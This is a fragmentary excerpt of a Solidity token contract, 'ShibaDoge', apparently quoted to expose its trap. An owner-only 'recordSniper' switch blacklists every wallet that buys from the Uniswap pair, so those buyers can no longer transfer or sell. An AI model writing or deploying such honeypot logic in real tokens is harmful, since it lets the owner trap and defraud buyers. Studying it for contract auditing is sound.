...
contract ShibaDoge is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x2eF9895DBB28513ce162b5748d1B2eFcC5388AF1));
    ...
    bool public recordSniper = false;
    ...
    function thanksGiving() public onlyOwner {
    ...
    function setRecordSniper(bool on) public onlyOwner {
        recordSniper = on;
    }
    ...
    function _transfer(
        ...
        require(!botWallets[from], "You're blacklisted");
        ...
        if(from == uniswapV2Pair && recordSniper) {
            botWallets[to] = true;
            botsWallet.push(to);
        }
